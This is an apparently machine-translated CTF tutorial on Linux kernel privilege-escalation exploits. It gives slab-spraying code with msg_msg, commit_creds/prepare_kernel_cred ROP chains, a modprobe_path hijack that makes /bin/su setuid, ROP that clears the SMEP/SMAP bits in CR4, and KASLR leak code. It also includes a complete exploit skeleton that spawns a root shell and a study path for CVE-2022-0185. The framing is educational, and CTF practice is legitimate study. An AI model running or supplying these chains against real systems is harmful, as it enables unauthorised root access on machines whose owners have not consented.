# Kernel Pwn (Kernel Pwn)

## Prepare the Environment

Typical core question set:

```text
kernel/
├── bzImage          # Compressed kernel image
├── vmlinux          # Uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # Vulnerable driver
├── run.sh           # qemu startup script
└── (.config)        # Compilation configuration, optional
```

### Unpack initramfs and modify the init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# Or newc format:
# cpio -idm < ../initramfs.cpio

# Modify init to get root (for CTF learning purposes, real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# Or comment out the line where user switches

# Repackaging
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (if only bzImage is provided)

```bash
# Using the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU Startup Parameter Template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # 开 gdb 端口 1234
```

Protection corresponding to key parameters:

| Parameter | Meaning | Impact on Utilization |
|------|------|---------|
| `+smep` | Kernel mode cannot execute user mode code | Must use ROP, cannot jump to user mode shellcode |
| `+smap` | Kernel mode cannot access user mode data | ROP chain cannot be placed in user mode, must be placed in kernel mode (heap spray / msgsnd) |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disable KASLR | Function address fixed |
| `kaslr` | Enable KASLR | Must leak |
| `pti=on` | KPTI (Meltdown fix) | Returning to user mode requires swapgs_restore_regs_and_return_to_usermode |

### Debug

```bash
# Terminal 1
./run.sh   # 带 -s

# Terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

GEF recommends using the fork maintained by bata24, which has a dedicated pretty-print for kernel structures.

## Vulnerability Type Routing

| Vulnerability | Typical Source | Exploitation Baseline |
|------|---------|---------|
| Kernel stack overflow | copy_from_user length controllable | Stack canary + KASLR → ROP |
| Kernel heap overflow | Out-of-bounds write in kmalloc slab | Slab spraying + overwrite adjacent objects |
| UAF | refcount error / double free | reallocate the same slab → control the released object |
| Integer overflow | size calculation overflow → small allocation, large copy | Actually an overflow, same as above |
| TOCTOU | User-space pointer double dereference | userfaultfd / FUSE time-wasting |
| race | dual-thread simultaneous ioctl | card timing window |
| Arbitrary read and write | Already the ultimate primitive | Directly modify cred / modprobe_path |

## slab spraying (heap pwn core)

Spray controllable-sized kernel objects onto the vulnerable slab to overwrite the target object.

| slab size | Spraying target | Advantages |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | Has function pointer, overwrite to control IP |
| kmalloc-1024 | `tty_struct` | Has ops pointer, finely crafted structure |
| kmalloc-4096 | `pipe_buffer` | Modern main version, still effective in 6.x |
| Any size | `msg_msg` | Size controllable (8 - 4096+), sysv msgsnd controls data |
| kmalloc-128 | `user_key_payload` | keyctl series interfaces |

### msg_msg Jet Example

```c
// User-mode trigger
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // 加上 msg_msg 头 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // 喷到 kmalloc-128
// ... trigger vulnerability override
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // 读回看是不是被改了 → leak
```

## Privilege Escalation Path

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and universal. Prerequisite: Able to control RIP (stack overflow / vtable hijacking).

```c
// User-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → 返回 root cred 到 rax
    pop_rdi,                          // pop rdi; ret
    /* 占位，下面 mov 会覆盖 */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // 转 rax→rdi（部分需要专门 gadget）
    commit_creds,                     // 设置当前进程 cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // 跳过 push 序列
    0, 0,                             // rax, rdi 占位
    user_rip,                         // 用户态返回函数（保存了 cs/ss）
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadget** (to find in vmlinux using ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Before returning to user mode, cs/ss/rflags/rsp must be saved:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Change modprobe_path to /tmp/x (easiest)

```text
Principle:
- The kernel global variable modprobe_path defaults to "/sbin/modprobe"
- When execve is called on a file with an unrecognized magic, the kernel calls modprobe_path to execute as root
- Change to "/tmp/x", write /tmp/x (chmod +x), trigger unknown magic execution
  
Applicable: Has arbitrary write primitives, but may not be able to ROP
```

```c
// 1. Prepare payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Vulnerability writing: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// Kernel root runs /tmp/x, did chmod +s /bin/su

// 5. Using setuid
system("/bin/su");
```

**modprobe_path address source**: symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to '|/tmp/x %P' so that it is called when the process crashes
Disadvantage: Requires triggering a coredump, which is clumsier than modprobe_path
```

### 4. Kernel ROP Close SMEP/SMAP

If you just want to jump back to user-mode shellcode (for learning purposes), you can use ROP to clear the CR4 bit:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// After turning off SMEP+SMAP, the jmp to user-mode shellcode can run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // CR4 期望值（去掉 SMEP/SMAP 位）
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" 之类
    0,
    user_shellcode_addr,    // 跳过去（如果还没关 SMEP 这步会失败）
};
```

In fact, **real exploitation basically doesn't go this route** — directly using commit_creds ROP is shorter and more stable.

## KASLR leak channels

| Source | Restriction | Remarks |
|------|------|------|
| /proc/kallsyms | `kptr_restrict=0` Only then is there a real address | CTF often open |
| /sys/module/.../sections/.text | Same as above | Module base address |
| dmesg | `dmesg_restrict=0` can only read | oops information leakage address |
| Kernel stack uninitialized read | The vulnerability itself allows arbitrary reading | Residual address |
| msg_msg + vulnerability leak | OOB read after spray | General |
| Bypass (Meltdown/Spectre) | KPTI fixed Meltdown | Not universal |
| SIDT/SGDT User-mode instruction | Old kernels may miss | Modern ones basically blocked |

```c
// Classic: Read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // 偏移看 vmlinux
```

## Complete exploit template (user mode + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — General skeleton for kernel pwn
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (directly hard-coded when leaked or no KASLR) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

// 1. leak KASLR base (here assume /proc/kallsyms is readable, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

// 2. Construct ROP (on the user stack or on the sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // 临时 user rsp，可指 mmap 高处
    rop[i++] = user_ss;

// 3. Trigger the vulnerability, causing the kernel RIP to jump to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // 题目相关：ioctl / write / read

    return 0;
}
```

## Study Reference: CVE-2022-0185

```text
Vulnerability: signed/unsigned confusion in length calculation of legacy_parse_param in fs/fs_context.c
→ kmalloc heap buffer overflow, size arbitrary, data arbitrary

Why it is a good learning example:
1. No root trigger required (unprivileged user namespace)
2. Overflow size is completely controllable
3. Publicly available with a complete writeup + PoC
4. Includes: user_ns exploitation, msg_msg spraying, UAF followed by reoccupation, cross-cache exploitation

Learning Path:
1. Compile the kernel with CONFIG_USER_NS=y
2. Run the original PoC of Crusaders of Rust: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Check the official writeup on willsroot.io (the version recorded by PortSwigger)
4. Manual override: change msg_msg spraying to the pipe_buffer spraying version (to practice different slab paths)
5. With the KASLR leak (the original version used /proc/kallsyms, in the challenge version after being disabled, it was changed to an OOB read)
```

The main technical points correspond to the sections of this document:

- Vulnerability Type → "Kernel Heap Overflow"
- Jet target → "msg_msg jet"
- Privilege escalation methods → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** Makes the kernel stack base randomly offset by 0-1023 on each syscall, affecting all exploits that rely on fixed stack offsets
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** Randomizes object allocation within the slab, reducing exploitation success rate, requiring more attempts
- **CONFIG_STATIC_USERMODEHELPER** sets modprobe_path to read-only `static_usermodehelper_path`, making modprobe attacks ineffective
- **KPTI** separates user-space/kernel-space page tables, so returning to user space must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline and cannot directly use swapgs+iretq
- **FG-KASLR** (function-granular KASLR) enables function-level randomization, requiring leaks of multiple symbols to deduce each function's offset
- **CET / IBT** (Intel Control-flow Enforcement Technology) requires indirect jumps to land on ENDBR instructions, causing some gadgets to fail
- **Do not use printk in the kernel for testing output** — serial IO will change timing and break races; use a magic register value (rcx=0xdeadbeef) + gdb watch to debug